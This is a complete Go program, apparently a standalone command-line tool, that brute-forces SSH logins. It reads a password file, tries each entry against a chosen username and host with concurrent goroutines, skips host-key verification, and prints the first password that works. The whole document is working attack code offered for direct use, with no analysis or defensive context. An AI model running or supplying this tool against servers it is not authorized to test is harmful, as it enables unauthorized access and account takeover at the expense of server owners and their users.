package main

import (
	"bufio"
	"fmt"
	"log"
	"os"

	"golang.org/x/crypto/ssh"
)

func printUsage() {
	fmt.Println(os.Args[0] + ` - Brute force SSH Password

Passwords should be separated by newlines.
URL should include hostname or ip with port number separated by colon

Usage:
  ` + os.Args[0] + ` <username> <pwlistfile> <url:port>

Example:
  ` + os.Args[0] + ` root passwords.txt example.com:22
`)
}

func checkArgs() (string, string, string) {
	if len(os.Args) != 4 {
		log.Println("Incorrect number of arguments.")
		printUsage()
		os.Exit(1)
	}

	// Username, Password list filename, URL
	return os.Args[1], os.Args[2], os.Args[3]
}

func testSSHAuth(url, username, password string, doneChannel chan bool) {
	sshConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		// Do not check server key
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),

		// Or, set the expected ssh.PublicKey from remote host
		//HostKeyCallback: ssh.FixedHostKey(pubkey),
	}

	_, err := ssh.Dial("tcp", url, sshConfig)
	if err != nil {
		// Print out the error so we can see if it is just a failed auth
		// or if it is a connection/name resolution problem.
		log.Println(err)
	} else { // Success
		log.Printf("Success!\nUser: %s\nPassword: %s\n", username, password)
		os.Exit(0)
	}

	doneChannel <- true // Signal another thread spot has opened up
}

func main() {

	username, pwListFilename, url := checkArgs()

	// Open password list file
	passwordFile, err := os.Open(pwListFilename)
	if err != nil {
		log.Fatal("Error opening file. ", err)
	}
	defer passwordFile.Close()

	// Default split method is on newline (bufio.ScanLines)
	scanner := bufio.NewScanner(passwordFile)

	doneChannel := make(chan bool)
	numThreads := 0
	maxThreads := 2

	// Check each password against url
	for scanner.Scan() {
		numThreads += 1

		password := scanner.Text()
		go testSSHAuth(url, username, password, doneChannel)

		// If max threads reached, wait for one to finish before continuing
		if numThreads >= maxThreads {
			<-doneChannel
			numThreads -= 1
		}
	}

	// Wait for all threads before repeating and fetching a new batch
	for numThreads > 0 {
		<-doneChannel
		numThreads -= 1
	}
}
